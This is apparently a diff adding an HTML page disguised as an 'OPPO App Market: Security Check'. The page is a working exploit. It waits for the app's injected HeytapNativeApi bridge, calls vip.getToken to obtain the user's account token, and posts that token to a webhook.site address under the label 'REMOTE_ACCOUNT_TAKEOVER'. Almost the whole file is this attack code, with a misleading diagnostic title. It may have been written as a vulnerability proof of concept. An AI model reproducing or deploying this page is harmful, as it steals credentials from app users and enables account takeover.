@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Diagnostic</title>
+</head>
+<body>
+    <h1 style="color: blue;">OPPO App Market: Security Check</h1>
+    <p id="status">Waiting for bridge injection...</p>
+
+    <script>
+        const exfilUrl = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
+
+        function leak_callback(data) {
+            document.getElementById("status").innerText = "SUCCESS: Token Captured!";
+            document.getElementById("status").style.color = "green";
+            
+            // Exfiltrate the token to your webhook
+            fetch(exfilUrl, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    vulnerability: "REMOTE_ACCOUNT_TAKEOVER",
+                    payload: data
+                })
+            });
+        }
+
+        // The app takes a moment to inject the native bridge
+        setTimeout(() => {
+            if (window.HeytapNativeApi) {
+                document.getElementById("status").innerText = "Bridge Injected. Calling vip.getToken...";
+                window.HeytapNativeApi.invoke("vip.getToken", "leak_callback");
+            } else {
+                document.getElementById("status").innerText = "Error: Bridge not found. Ensure you used the Deep Link.";
+                document.getElementById("status").style.color = "red";
+            }
+        }, 1500);
+    </script>
+</body>
+</html>
